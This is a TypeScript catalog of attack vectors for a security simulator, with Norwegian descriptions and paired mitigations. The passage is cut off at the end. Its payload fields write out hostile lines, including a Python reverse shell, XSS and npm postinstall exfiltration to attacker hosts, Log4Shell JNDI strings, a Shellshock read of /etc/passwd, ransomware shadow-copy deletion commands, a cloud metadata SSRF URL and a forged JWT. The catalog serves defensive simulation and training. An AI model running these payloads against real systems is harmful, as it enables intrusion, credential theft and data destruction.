import { AttackVector } from '../types';
import { OWASP_AUTOMATED_ATTACKS } from './owaspAutomatedThreatCatalog';
import { AI_SECURITY_ATTACKS } from './aiSecurityAttackCatalog';
import { FAMOUS_TROJANS_AND_THREATS_CATALOG } from './trojansAndFamousThreatsCatalog';

/**
 * MASTER REGISTER OF KNOWN & REGISTERED CYBER ATTACK VECTORS
 * Covers CVEs, MITRE ATT&CK Techniques, OWASP Top 10, and historical APT campaigns.
 * Designed for extensible addition of custom vectors.
 */
export const CORE_ATTACK_CATALOG: AttackVector[] = [
  // 1. RECONNAISSANCE & OSINT
  {
    id: 1,
    name: 'Basis Avsøkning (Recon Probe)',
    category: 'RECON',
    cve: 'N/A (MITRE T1046)',
    mitreId: 'T1046',
    owaspTag: 'Reconnaissance',
    year: 2024,
    protocol: 'TCP / SYN Scan',
    description: 'Nettverkskartlegging av åpne porter, tjenesteversjoner og HTTP-headers. Typisk innledende fase for angripere.',
    payload: { type: 'recon', target: 'ports', probe: 'TCP_SYN_SCAN_8080', nmap_args: '-sS -sV -T4 -p 1-65535' },
    defaultCountermeasure: 'Mirror Jamming (Speiler trafikken tilbake for å forvirre skanneren)',
    recommendedMitigation: 'Port knocking, automatisk IP-tarpit og skjuling av server-banner.',
    riskLevel: 'LOW',
    enabled: true,
  },

  // 2. SQL INJECTION
  {
    id: 2,
    name: 'SQL-Injisering (SQLi Datatyveri)',
    category: 'SQLI',
    cve: 'CWE-89 (OWASP A03:2021)',
    mitreId: 'T1190',
    owaspTag: 'A03:2021-Injection',
    year: 2023,
    protocol: 'HTTP / SQL',
    description: 'Forsøk på å omgå autentisering og hente ut sensitive databaserabeller via manipulerte SQL-kommandoer.',
    payload: { query: "SELECT * FROM users WHERE admin=1 OR '1'='1' UNION SELECT username, password_hash, ssn FROM credentials--" },
    defaultCountermeasure: 'Mirror Jamming (Sender syntetiske databasefeil og falske tabeller i retur)',
    recommendedMitigation: 'Bruk parametriserte spørringer (Prepared Statements) og ORM med streng input-validering.',
    riskLevel: 'HIGH',
    enabled: true,
  },

  // 3. REMOTE CODE EXECUTION
  {
    id: 3,
    name: 'Skadevare / Kode-eksekvering (RCE Shell)',
    category: 'RCE',
    cve: 'CWE-94 (MITRE T1059)',
    mitreId: 'T1059.006',
    owaspTag: 'A03:2021-Injection',
    year: 2024,
    protocol: 'TCP / Reverse Shell',
    description: 'Kritisk forsøk på å kjøre vilkårlig shell-kode på vertssystemet for å etablere en reversert interaktiv shell-kobling.',
    payload: { payload: "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"185.220.101.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'" },
    defaultCountermeasure: 'Blackout Isolation (Bannlyser IP-en permanent og kutter all kontakt)',
    recommendedMitigation: 'Kjør applikasjoner uten root-rettigheter i et skrivebeskyttet filsystem med Seccomp/AppArmor.',
    riskLevel: 'CRITICAL',
    enabled: true,
  },

  // 4. CROSS-SITE SCRIPTING
  {
    id: 4,
    name: 'Nettleser-skripting (XSS Injisering)',
    category: 'XSS',
    cve: 'CWE-79 (OWASP A03:2021)',
    mitreId: 'T1189',
    owaspTag: 'A03:2021-Injection',
    year: 2023,
    protocol: 'HTTP / DOM',
    description: 'Innsending av manipulerte skript-tagger for å stjele sesjonsinformasjon og JWT-tokens fra klientens nettleser.',
    payload: { script: "<script>fetch('https://c2-exfil.attacker.net/steal?c='+encodeURIComponent(document.cookie))</script><img src=x onerror=alert('PWNED')>" },
    defaultCountermeasure: 'Phantom Loop (Fanger trusselen i en isolert sandboks-tarpit)',
    recommendedMitigation: 'Bruk streng Content Security Policy (CSP), HttpOnly-flagg på cookies og kontekstuell HTML-encoding.',
    riskLevel: 'MEDIUM',
    enabled: true,
  },

  // 5. ZERO-DAY POLYMORPHIC STREAM
  {
    id: 5,
    name: 'Obfuskert Zero-Day Stream',
    category: 'ZERO_DAY',
    cve: 'Zero-Day Unknown',
    mitreId: 'T1027',
    owaspTag: 'A06:2021-Outdated Components',
    year: 2026,
    protocol: 'Raw Binary / Multi-stage',
    description: 'Mørk binær strøm med høy Shannon-entropi uten kjente signaturer. Tester AI-entropideteksjon.',
    payload: { blob: 'x9f8a7b6c5d4e3f2_MUTATED_ZERO_DAY_POLYMORPHIC_BYTE_STREAM_0xFF90_PAYLOAD_ELEVATION_STAGE_0' },
    defaultCountermeasure: 'Phantom Loop (Oppdaget via Shannon Entropi > 5.20 og isolert i MicroVM)',
    recommendedMitigation: 'Dynamisk heuristisk atferdsanalyse og minne-scrambling (ASLR + CET).',
    riskLevel: 'CRITICAL',
    enabled: true,
  },

  // 6. CLASSIC DOS BUFFER OVERFLOW
  {
    id: 6,
    name: 'Overbelastningsangrep (Klassisk DoS Flom)',
    category: 'DOS',
    cve: 'CWE-120 (MITRE T1499)',
    mitreId: 'T1499.001',
    owaspTag: 'A04:2021-Insecure Design',
    year: 2022,
    protocol: 'TCP / Memory Exhaustion',
    description: 'Massiv buffer-overflow test med store repeterende mønstre for å fremprovosere stack-smashing og minnefeil.',
    payload: { pattern: 'A'.repeat(2400) + '\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07' },
    defaultCountermeasure: 'Blackout Isolation (Kuttet på grunn av unormalt datavolum og buffergrenser)',
    recommendedMitigation: 'Bruk minnesikre språk (Rust/Go), stack canaries (-fstack-protector-all) og ASLR.',
    riskLevel: 'HIGH',
    enabled: true,
  },

  // 7. DDOS: TCP SYN FLOOD
  {
    id: 7,
    name: 'DDoS: TCP SYN Flood (L4 Tilstand)',
    category: 'DDOS',
    cve: 'RFC 4987 (MITRE T1498)',
    mitreId: 'T1498.001',
    owaspTag: 'Volumetric L4',
    year: 2024,
    protocol: 'TCP SYN',
    description: 'Massiv flom av ubesvarte TCP SYN-pakker fra tusenvis av spoofede adresser som utmatter tilstandstabellen.',
    payload: { 
      attack: 'syn_flood', 
      flags: 'SYN', 
      rate_pps: 140000, 
      window_size: 1024,
      target_port: 443,
      spoofed_range: '198.51.100.0/24'
    },
    defaultCountermeasure: 'SYN-Cookie Proxy & Aggressiv Half-Open Drop',
    recommendedMitigation: 'Aktiver syncookies i Linux-kjerne (sysctl -w net.ipv4.tcp_syncookies=1) og maskinvare-akselerert brannmur.',
    riskLevel: 'CRITICAL',
    enabled: true,
    ddosProtocol: 'TCP_SYN',
    volumetricGbps: 18,
    packetsPerSec: 140000,
  },

  // 8. DDOS: UDP AMPLIFICATION
  {
    id: 8,
    name: 'DDoS: UDP Amplification (DNS/NTP Refleksjon)',
    category: 'DDOS',
    cve: 'CWE-406 (MITRE T1498.002)',
    mitreId: 'T1498.002',
    owaspTag: 'Volumetric L4',
    year: 2024,
    protocol: 'UDP / DNS Any & NTP Monlist',
    description: 'Volumetrisk refleksjon som utnytter åpne DNS resolver- eller NTP monlist-servere med 50x forsterkningsfaktor.',
    payload: { 
      attack: 'udp_amp', 
      subprotocol: 'DNS_ANY_QUERY_AMPLIFICATION', 
      reflector_count: 3200, 
      bandwidth_gbps: 65,
      amplification_factor: 54
    },
    defaultCountermeasure: 'BGP Anycast Scrubbing & UDP Rate-Limiting Filter',
    recommendedMitigation: 'Deaktiver monlist i NTP (noquery), lukk åpne DNS-resolvere og implementer BGP Flowspec.',
    riskLevel: 'CRITICAL',
    enabled: true,
    ddosProtocol: 'UDP_AMP',
    volumetricGbps: 65,
    packetsPerSec: 450000,
  },

  // 9. DDOS: SLOWLORIS
  {
    id: 9,
    name: 'DDoS: Slowloris Connection Starvation',
    category: 'DDOS',
    cve: 'CWE-400 (MITRE T1499.003)',
    mitreId: 'T1499.003',
    owaspTag: 'Application DoS',
    year: 2023,
    protocol: 'HTTP / Slow Headers',
    description: 'Low-and-Slow applikasjonsangrep som sender ufullstendige HTTP headers med lange intervaller for å låse alle webservertråder.',
    payload: { 
      attack: 'slowloris', 
      method: 'GET', 
      keep_alive_headers: 'X-a: 1\\r\\nX-b: 2\\r\\n(slow_stream_delay_15s)',
      held_sockets: 2500
    },
    defaultCountermeasure: 'Aggressiv Keep-Alive Timeout & Tilkoblingsbegrensning per IP',
    recommendedMitigation: 'Sett `client_body_timeout 5s` og `client_header_timeout 5s` i Nginx / revers proxy.',
    riskLevel: 'HIGH',
    enabled: true,
    ddosProtocol: 'SLOWLORIS',
    volumetricGbps: 0.2,
    packetsPerSec: 2500,
  },

  // 10. DDOS: L7 HTTP FLOOD
  {
    id: 10,
    name: 'DDoS: L7 HTTP GET/POST Applikasjonsflom',
    category: 'DDOS',
    cve: 'CWE-400 (MITRE T1499)',
    mitreId: 'T1499',
    owaspTag: 'Application L7 DoS',
    year: 2024,
    protocol: 'HTTPS / TLS',
    description: 'Avansert applikasjonslagsflom rettet mot tunge database-søk eller ressurskrevende API-endepunkter med gyldige TLS-handshakes.',
    payload: { 
      attack: 'http_flood', 
      target_endpoint: '/api/v1/search?query=expensive_join_all_tables', 
      rps: 85000, 
      user_agent_rotation: true,
      cookie_bypass: true
    },
    defaultCountermeasure: 'WAF Rate-Limiting, TLS Fingerprinting & JS Challenge',
    recommendedMitigation: 'Implementer JA3/JA4 TLS-fingerprinting, Cloudflare / WAF utfordringer og caching på kanten.',
    riskLevel: 'CRITICAL',
    enabled: true,
    ddosProtocol: 'HTTP_FLOOD',
    volumetricGbps: 12,
    packetsPerSec: 85000,
  },

  // 11. DDOS: MIRAI BOTNET SWARM
  {
    id: 11,
    name: 'DDoS: Mirai / Reaper IoT Botnett-Sverm',
    category: 'DDOS',
    cve: 'CVE-2016-10372 (MITRE T1584)',
    mitreId: 'T1584.005',
    owaspTag: 'Botnet Distributed',
    year: 2024,
    protocol: 'IoT Multi-Vector / GRE',
    description: 'Distribuert koordinert angrep fra et globalt nettverk av kompromitterte rutere, DVR-opptakere og IP-kameraer.',
    payload: { 
      attack: 'botnet_mirai_swarm', 
      infected_nodes: 28500, 
      vectors: ['TCP_ACK_FLOOD', 'GRE_IP_FLOOD', 'STOMP'], 
      total_bandwidth_gbps: 120
    },
    defaultCountermeasure: 'Global BGP Blackhole Routing & Autonom Botnett-Isolasjon',
    recommendedMitigation: 'Endre standard fabrikkpassord på IoT-enheter, lukk Telnet/UPnP og bruk GeoIP-filtrering.',
    riskLevel: 'CRITICAL',
    enabled: true,
    ddosProtocol: 'BOTNET',
    volumetricGbps: 120,
    packetsPerSec: 720000,
  },

  // 12. DDOS: ICMP SMURF FLOOD
  {
    id: 12,
    name: 'DDoS: ICMP Smurf & Gateway Flood',
    category: 'DDOS',
    cve: 'RFC 792 (MITRE T1498)',
    mitreId: 'T1498',
    owaspTag: 'Network L3 DoS',
    year: 2023,
    protocol: 'ICMP Echo / Broadcast',
    description: 'Forsterket ICMP Echo Request flom mot nettverksbroer for å mette innkommende gateway-ruter og fiberlinje.',
    payload: { 
      attack: 'icmp_smurf_flood', 
      packet_type: 'ECHO_REQUEST', 
      broadcast_amplified: true, 
      pps: 95000 
    },
    defaultCountermeasure: 'ICMP Gateway Drop & Border Gateway Protocol Shaper',
    recommendedMitigation: 'Deaktiver IP-directed broadcast på rutere og sett strenge brannmurregler for ICMP rate-limit.',
    riskLevel: 'MEDIUM',
    enabled: true,
    ddosProtocol: 'ICMP',
    volumetricGbps: 8.5,
    packetsPerSec: 95000,
  },

  // 13. LOG4SHELL (CVE-2021-44228)
  {
    id: 13,
    name: 'Log4Shell JNDI/LDAP Injection (Apache Log4j2)',
    category: 'RCE',
    cve: 'CVE-2021-44228',
    mitreId: 'T1190',
    owaspTag: 'A06:2021-Vulnerable Components',
    year: 2021,
    protocol: 'LDAP / JNDI over HTTP',
    description: 'Innsending av JNDI-oppslagsmønstre i HTTP headers (User-Agent, X-Api-Version) som får Log4j2 til å laste og kjøre vilkårlig Java-kode fra en angriper-kontrollert LDAP-server.',
    payload: { 
      header: 'User-Agent',
      injection: '${jndi:ldap://c2-malicious-ldap.corp-threat.io:1389/ExploitClass}',
      nested_bypass: '${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://198.51.100.42:1389/Payload}'
    },
    defaultCountermeasure: 'JNDI Protocol Quarantine & Restriktiv Java Classpath Filtering',
    recommendedMitigation: 'Oppgrader til Log4j 2.17.1+, sett log4j2.formatMsgNoLookups=true og blokker utgående LDAP (389/636) i brannmur.',
    riskLevel: 'CRITICAL',
    enabled: true,
  },

  // 14. ETERNALBLUE (MS17-010 / CVE-2017-0144)
  {
    id: 14,
    name: 'EternalBlue SMBv1 Buffer Overflow (NSA / WannaCry)',
    category: 'MEMORY_CORRUPTION',
    cve: 'CVE-2017-0144 (MS17-010)',
    mitreId: 'T1210',
    owaspTag: 'Kernel Pool Corruption',
    year: 2017,
    protocol: 'SMBv1 Port 445',
    description: 'Utnytter feil i SMBv1-serverens håndtering av SrvOs2FeaToNt for å overskrive minnepool i Windows-kjerne og oppnå full SYSTEM-tilgang uten innlogging.',
    payload: { 
      exploit: 'EternalBlue_MS17_010',
      target_port: 445,
      fea_size_overflow: '0x00010000',
      kernel_shellcode: 'Ring0_Privilege_Escalation_DoublePulsar_Hook'
    },
    defaultCountermeasure: 'Kernel Pool Isolation & Umiddelbar SMBv1 Port 445 Blokkering',
    recommendedMitigation: 'Deaktiver SMBv1 fullstendig via PowerShell (`Disable-WindowsOptionalFeature -FeatureName SMB1Protocol`), installer MS17-010 oppdatering.',
    riskLevel: 'CRITICAL',
    enabled: true,
  },

  // 15. WANNACRY / LOCKBIT 3.0 RANSOMWARE
  {
    id: 15,
    name: 'LockBit 3.0 / WannaCry Autonom Ransomware',
    category: 'RANSOMWARE',
    cve: 'MITRE T1486 (Data Encrypted for Impact)',
    mitreId: 'T1486',
    owaspTag: 'Ransomware / Extortion',
    year: 2024,
    protocol: 'SMB / WMI Lateral Movement',
    description: 'Automatisk sletting av skyggekopier (VSS), kryptering av dokumenter og databaser med ChaCha20/RSA-4096 og plassering av løsepengekrav.',
    payload: { 
      ransomware: 'LockBit_3.0_Black_Variant',
      commands: [
        'vssadmin.exe delete shadows /all /quiet',
        'wbadmin delete catalog -quiet',
        'bcdedit /set {default} recoveryenabled No'
      ],
      encryption_target_ext: ['.docx', '.xlsx', '.pdf', '.sql', '.mdf', '.bak'],
      ransom_note: 'Restore-My-Files.txt'
    },
    defaultCountermeasure: 'Canary Honeyfile Alarm & Øyeblikkelig Skrivebeskyttelse av Volumer',
    recommendedMitigation: 'Oppretthold uforanderlige WORM offline-sikkerhetskopier (3-2-1 regel), implementer endpoint behavior blockers mot vssadmin.',
    riskLevel: 'CRITICAL',
    enabled: true,
  },

  // 16. HEARTBLEED (CVE-2014-0160)
  {
    id: 16,
    name: 'Heartbleed TLS Minnelekkasje (OpenSSL)',
    category: 'MEMORY_CORRUPTION',
    cve: 'CVE-2014-0160',
    mitreId: 'T1005',
    owaspTag: 'A06:2021-Outdated Components',
    year: 2014,
    protocol: 'TLS Heartbeat Extension',
    description: 'Manglende grensekontroll i OpenSSL TLS Heartbeat-håndtering som tillater en angriper å lese opptil 64 KB med rå minne (private nøkler, passord) per henvendelse.',
    payload: { 
      protocol: 'TLS_Heartbeat_Extension',
      declared_length: 65535,
      actual_payload_length: 1,
      malicious_buffer: '0x180302000301ffff'
    },
    defaultCountermeasure: 'Strict Bounds-Checking & Minnesanitering i TLS-Terminering',
    recommendedMitigation: 'Oppgrader OpenSSL til 1.0.1g+, roter alle SSL/TLS private nøkler og sesjonscookies.',
    riskLevel: 'HIGH',
    enabled: true,
  },

  // 17. SOLARWINDS SUNBURST (CVE-2020-10148)
  {
    id: 17,
    name: 'SolarWinds SUNBURST Supply Chain Bakdør (APT29)',
    category: 'SUPPLY_CHAIN',
    cve: 'CVE-2020-10148',
    mitreId: 'T1195.002',
    owaspTag: 'A08:2021-Software and Data Integrity',
    year: 2020,
    protocol: 'DNS DGA / HTTPS C2 Beacon',
    description: 'Injisert ondsinnet kode i Orion programvareoppdatering som venter to uker før den genererer dynamiske DGA-forespørsler mot C2-infrastruktur.',
    payload: { 
      trojanized_file: 'SolarWinds.Orion.Core.BusinessLayer.dll',
      dga_domain: 'appsync-api.eu-west-1.avsvmcloud.com',
      beacon_sleep_ms: 1209600000,
      encrypted_http_c2: 'AVSVMCLOUD_TUNNEL'
    },
    defaultCountermeasure: 'Kryptografisk Bygge-Pipeline Attestering & DGA Sinkhole',
    recommendedMitigation: 'Signerte byggesertifikater, deterministiske reproduserbare bygg og streng egress-overvåking for interne servere.',
    riskLevel: 'CRITICAL',
    enabled: true,
  },

  // 18. SPRING4SHELL (CVE-2022-22965)
  {
    id: 18,
    name: 'Spring4Shell RCE (Spring Framework DataBinder)',
    category: 'RCE',
    cve: 'CVE-2022-22965',
    mitreId: 'T1190',
    owaspTag: 'A06:2021-Outdated Components',
    year: 2022,
    protocol: 'HTTP POST / Bean Manipulation',
    description: 'DataBinder manipulasjon via class.module.classLoader for å manipulere Tomcat AccessLogValve og skrive en ondsinnet JSP web shell til disk.',
    payload: { 
      exploit: 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp',
      target_location: 'webapps/ROOT/shell.jsp'
    },
    defaultCountermeasure: 'DisallowedFields Parameter Blokkering & JVM Sandboksing',
    recommendedMitigation: 'Oppgrader Spring Framework til versjon 5.3.18+ eller 5.2.20+, eller kjør på Java 8 eller Tomcat oppgradert.',
    riskLevel: 'CRITICAL',
    enabled: true,
  },

  // 19. ZEROLOGON (CVE-2020-1472)
  {
    id: 19,
    name: 'ZeroLogon AD Domeneovertakelse (Netlogon)',
    category: 'PRIVILEGE_ESCALATION',
    cve: 'CVE-2020-1472',
    mitreId: 'T1210',
    owaspTag: 'A02:2021-Cryptographic Failures',
    year: 2020,
    protocol: 'MS-NRPC Port 135/445',
    description: 'Kryptografisk sårbarhet i Netlogon AES-CFB8 med statisk null-IV (0x00) som tillater angriper å nullstille passordet til Active Directory Domain Controller.',
    payload: { 
      client_challenge: '0000000000000000',
      client_credential: '0000000000000000',
      negotiate_flags: '0x212fffff',
      reset_computer_account: 'DC_ADMIN_PASSWORD_EMPTY'
    },
    defaultCountermeasure: 'Håndheving av Sikker RPC-Kanal & AD Kerberos Audit',
    recommendedMitigation: 'Installer Microsoft sikkerhetsoppdatering for CVE-2020-1472 og håndhev "Secure RPC Netlogon" på alle domenekontrollere.',
    riskLevel: 'CRITICAL',
    enabled: true,
  },

  // 20. SHELLSHOCK (CVE-2014-6271)
  {
    id: 20,
    name: 'Shellshock Bash Miljøvariabel-Injisering',
    category: 'RCE',
    cve: 'CVE-2014-6271',
    mitreId: 'T1059.004',
    owaspTag: 'A03:2021-Injection',
    year: 2014,
    protocol: 'HTTP / CGI Environment',
    description: 'GNU Bash feiltolker etterfølgende kommandoer i funksjonsdefinisjoner i miljøvariabler (f.eks. via HTTP User-Agent eller Referer i CGI-skript).',
    payload: { 
      env_header: 'User-Agent: () { :;}; echo "Content-Type: text/plain"; echo; /bin/cat /etc/passwd; /bin/uname -a'
    },
    defaultCountermeasure: 'Miljøvariabel Sanitering & CGI Sandboksing',
    recommendedMitigation: 'Oppgrader GNU Bash til nyeste versjon og unngå eldre CGI-moduler som sender rå HTTP-headere inn i subshells.',
    riskLevel: 'HIGH',
    enabled: true,
  },

  // 21. JWT NONE ALGORITHM AUTHENTICATION BYPASS
  {
    id: 21,
    name: 'JWT "alg: none" Autentiseringsomgåelse',
    category: 'AUTH_BYPASS',
    cve: 'CVE-2015-9235 (CWE-347)',
    mitreId: 'T1556',
    owaspTag: 'A07:2021-Identification and Authentication',
    year: 2021,
    protocol: 'JSON Web Token (JWT)',
    description: 'Manipulering av JWT header til å angi `"alg": "none"`. Sårbare biblioteker godkjenner tokenet som gyldig uten å verifisere kryptografisk signatur.',
    payload: { 
      token: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMzM3IiwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGVzIjpbIlNVUEVSX0FETUlOIl0sImV4cCI6OTk5OTk5OTk5OX0.',
      forged_role: 'SUPER_ADMIN'
    },
    defaultCountermeasure: 'Strict Algorithm Whitelist & Signaturvalidering',
    recommendedMitigation: 'Konfigurer JWT-validerer til eksplisitt å kreve spesifikke algoritmer (f.eks. RS256/ES256) og avvise "none" permanent.',
    riskLevel: 'HIGH',
    enabled: true,
  },

  // 22. BOLA / IDOR REST API OBJECT HIJACK
  {
    id: 22,
    name: 'BOLA / IDOR API Objektmanipulasjon',
    category: 'API_GRAPHQL',
    cve: 'OWASP API1:2023 (BOLA)',
    mitreId: 'T1078',
    owaspTag: 'API1:2023-Broken Object Level Authorization',
    year: 2024,
    protocol: 'REST API / JSON',
    description: 'Uautorisert henting eller modifisering av andre kunders bankkontoer eller pasientjournaler ved å endre objekt-ID i REST-forespørselen.',
    payload: { 
      method: 'GET',
      endpoint: '/api/v2/organizations/org-89412/financial_records?unredacted=true',
      caller_tenant: 'org-11002',
      victim_tenant: 'org-89412'
    },
    defaultCountermeasure: 'Kontekstuell RBAC Validering & Multi-Tenant Isolasjon',
    recommendedMitigation: 'Valider alltid at den innloggede brukeren har eksplisitte tilgangsrettigheter til ressursens eierskaps-ID på servernivå.',
    riskLevel: 'HIGH',
    enabled: true,
  },

  // 23. GRAPHQL RECURSIVE DEPTH FLOOD
  {
    id: 23,
    name: 'GraphQL Sirkulær Dybde & Batching Flom',
    category: 'API_GRAPHQL',
    cve: 'OWASP API4:2023 (Unrestricted Resource Consumption)',
    mitreId: 'T1499',
    owaspTag: 'API4:2023-Resource Consumption',
    year: 2024,
    protocol: 'GraphQL / HTTP POST',
    description: 'Sirkulære relasjonsspørringer med 50+ nestede nivåer eller batching av 1000 spørringer i en enkelt HTTP-pakke som knekker backend-databasen.',
    payload: { 
      query: '{ viewer { friends(first: 100) { friends(first: 100) { friends(first: 100) { friends(first: 100) { id, email, creditCard { number } } } } } } }'
    },
    defaultCountermeasure: 'AST Query Depth Limiter & Kostnadsanalyse',
    recommendedMitigation: 'Implementer graphql-depth-limit (maks dybde 5-7), sett query cost calculation og begrens batching til maks 10 operasjoner.',
    riskLevel: 'HIGH',
    enabled: true,
  },

  // 24. STUXNET PLC SCADA MODBUS OVERWRITE
  {
    id: 24,
    name: 'Stuxnet PLC SCADA Modbus Overwrite (Industriell Sabotasje)',
    category: 'ICS_SCADA',
    cve: 'MITRE T0800 (Inhibit Response Function)',
    mitreId: 'T0800',
    owaspTag: 'ICS/OT Critical Infrastructure',
    year: 2024,
    protocol: 'Modbus TCP Port 502 / S7comm',
    description: 'Manipulering av industrielle kontrollsystemer (ICS) for å overskrive frekvensomformere og sentrifuger med destruktive rotasjonshastigheter.',
    payload: { 
      protocol: 'MODBUS_TCP',
      unit_id: 1,
      function_code: 16, // Write Multiple Registers
      target_register: 40012,
      destructive_rpm_override: [1410, 2, 1410, 2], // Resonant frequency destruction
      tampered_sensor_feedback: [1064, 1064] // Fake normal telemetry to operators
    },
    defaultCountermeasure: 'Enveis Data-Diode & Maskinvaresertifisert PLC-Signatur',
    recommendedMitigation: 'Bruk maskinvarebaserte datadioder, segmenter OT-nettverk med IEC 62443 soner og krypter Modbus/S7comm kommunikasjon.',
    riskLevel: 'CRITICAL',
    enabled: true,
  },

  // 25. KAMINSKY DNS CACHE POISONING
  {
    id: 25,
    name: 'Kaminsky DNS Cache Forgiftning (DNS Spoofing)',
    category: 'AUTH_BYPASS',
    cve: 'CVE-2008-1447',
    mitreId: 'T1584.002',
    owaspTag: 'Network Infrastructure Poisoning',
    year: 2022,
    protocol: 'UDP Port 53 / DNS',
    description: 'Sending av tusenvis av forfalskede DNS-svar med bursdagsparadokset for å gjette Transaction ID og forgifte resolverens cache for et helt domene.',
    payload: { 
      target_domain: 'bank-auth.global-secure.no',
      poisoned_ns_glue: 'ns1.attacker-controlled-c2.net',
      spoofed_tx_id_burst: [14022, 14023, 14024, 14025],
      udp_source_port_fixed: 53
    },
    defaultCountermeasure: 'DNSSEC Validering & Kryptografisk Port-Randomisering',
    recommendedMitigation: 'Aktiver DNSSEC validering på alle rekursive resolvere og håndhev kildeport-randomisering (0x20 encoding).',
    riskLevel: 'HIGH',
    enabled: true,
  },

  // 26. DIRTY COW KERNEL PRIVILEGE ESCALATION
  {
    id: 26,
    name: 'Dirty COW Linux Kernel Privilege Escalation',
    category: 'PRIVILEGE_ESCALATION',
    cve: 'CVE-2016-5195',
    mitreId: 'T1068',
    owaspTag: 'Local Privilege Escalation',
    year: 2021,
    protocol: 'Linux Kernel Memory / Copy-On-Write',
    description: 'Race condition i Linux-kjernens Copy-On-Write (COW) minnehåndtering som tillater en lokal bruker uten rettigheter å overskrive skrivebeskyttet minne (f.eks. /etc/passwd).',
    payload: { 
      race_condition: 'madvise(MADV_DONTNEED) vs /proc/self/mem write',
      target_file: '/etc/passwd',
      injected_root_line: 'firewall_root:0:0:root:/root:/bin/bash'
    },
    defaultCountermeasure: 'KASLR Minnebeskyttelse & Kernel Page Table Isolation',
    recommendedMitigation: 'Oppgrader Linux-kjerne til patchet versjon og håndhev restriktive SELinux/AppArmor profiler.',
    riskLevel: 'HIGH',
    enabled: true,
  },

  // 27. SSRF CLOUD METADATA EXFILTRATION
  {
    id: 27,
    name: 'SSRF Cloud IAM Metadata Eksfiltrering (AWS IMDSv1)',
    category: 'AUTH_BYPASS',
    cve: 'CWE-918 (MITRE T1552.005)',
    mitreId: 'T1552.005',
    owaspTag: 'A10:2021-Server-Side Request Forgery',
    year: 2024,
    protocol: 'HTTP / Cloud Metadata IP',
    description: 'Tvinger serveren til å hente AWS/GCP instans-metadata og midlertidige IAM-sikkerhetsnøkler via utilstrekkelig validert URL-inndata.',
    payload: { 
      fetch_url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/production-ec2-role',
      bypass_patterns: ['http://[::ffff:169.254.169.254]/', 'http://0xa9fea9fe/']
    },
    defaultCountermeasure: 'IMDSv2 Session Token Krav & Egress Brannmurfiltrering',
    recommendedMitigation: 'Håndhev AWS IMDSv2 (krever session token header), deaktiver IMDSv1 og blokker 169.254.169.254 i lokale nettverksregler.',
    riskLevel: 'CRITICAL',
    enabled: true,
  },

  // 28. PYPI / NPM SUPPLY CHAIN TYPOSQUATTING
  {
    id: 28,
    name: 'NPM/PyPI Typosquatting Supply Chain Injisering',
    category: 'SUPPLY_CHAIN',
    cve: 'MITRE T1195.001',
    mitreId: 'T1195.001',
    owaspTag: 'A08:2021-Software and Data Integrity',
    year: 2024,
    protocol: 'NPM postinstall / PyPI setup.py',
    description: 'Publisering av ondsinnet pakke med navnelikhet (f.eks. "cross-env-load") som eksekverer kode ved installasjon og stjeler .env-hemmeligheter.',
    payload: { 
      package_name: 'react-tailwind-dom-utility',
      postinstall_script: 'node -e "https.get(\'https://c2.dev/harvest?e=\'+Buffer.from(JSON.stringify(process.env)).toString(\'base64\'))"'
    },
    defaultCountermeasure: 'Pakkesignatur Sjekksum & Luftgap Internt Repository',
    recommendedMitigation: 'Bruk lockfile integrity sjekk, kjør `npm audit` og deaktiver automatiske installasjonsskript med `--ignore-scripts`.',
    riskLevel: 'HIGH',
    enabled: true,
  },

  // 29. PASS-THE-HASH & KERBEROASTING
  {
    id: 29,
    name: 'Kerberoasting & Pass-the-Hash AD Rekognosering',
    category: 'AUTH_BYPASS',
    cve: 'MITRE T1558.003 / T1550.002',
    mitreId: 'T1558.003',
    owaspTag: 'A07:2021-Identification Failures',
    year: 2023,
    protocol: 'Kerberos TGS-REQ Port 88',
    description: 'Uthenting av RC4-krypterte Service Principal Name (SPN) billetter fra Active Directory for offline hash-knekking med Hashcat.',
    payload: { 
      spn_target: 'MSSQLSvc/sql-cluster.corp.internal:1433',
      request_type: 'KRB_TGS_REQ',
      encryption_type: 'RC4_HMAC_MD5 (etype 23)',
      offline_hash: '$krb5tgs$23$*user$realm$spn*$hash...'
    },
    defaultCountermeasure: 'AES-256 Kerberos Tvang & Managed Service Accounts (gMSA)',
    recommendedMitigation: 'Deaktiver RC4 i Kerberos, bruk 25+ tegns komplekse passord på tjenestekontoer eller migrer til gMSA.',
    riskLevel: 'HIGH',
    enabled: true,
  },

  // 30. COBALT STRIKE / METERPRETER BEACON
  {
    id: 30,
    name: 'Cobalt Strike Malleable C2 Beaconing',
    category: 'RCE',
    cve: 'MITRE T1071.001 (Web Protocols)',
    mitreId: 'T1071.001',
    owaspTag: 'Command and Control',
    year: 2024,
    protocol: 'HTTPS / Obfuscated Sleep Mask',
    description: 'Avansert APT-kommando og kontrollkanal forkledd som ordinær jQuery CDN trafikk med minne-kryptering mellom aktive pulser.',
    payload: { 
      c2_profile: 'Amazon_Cloudfront_JQuery_CDN',
      sleep_time_seconds: 60,
      jitter_percentage: 35,
      memory_protection: 'SleepMask_VirtualProtect_RX_RW'
    },
    defaultCountermeasure: 'EDR Atferdsanalyse & JA4 TLS Fingerprint Blokkering',
    recommendedMitigation: 'Implementer nettverksbasert JA4+ TLS-inspeksjon, EDR med memory scan (Hunt-Sleeping-Beacons) og proxy-krav.',
    riskLevel: 'CRITICAL',
    enabled: true,
  }
];

/**
 * Unified master catalog. Core vectors are retained, while the OWASP OAT and
 * AI/TIP/MCP packs are merged into the same simulator surface.
 */
export const MASTER_ATTACK_CATALOG: AttackVector[] = [
  ...CORE_ATTACK_CATALOG,
  ...FAMOUS_TROJANS_AND_THREATS_CATALOG,
  ...OWASP_AUTOMATED_ATTACKS,
  ...AI_SECURITY_ATTACKS,
].map((vector) => ({
  ...vector,
  safeSimulation: vector.safeSimulation ?? true,
  frameworks: vector.frameworks ?? [
    ...(vector.owaspTag ? ['OWASP'] : []),
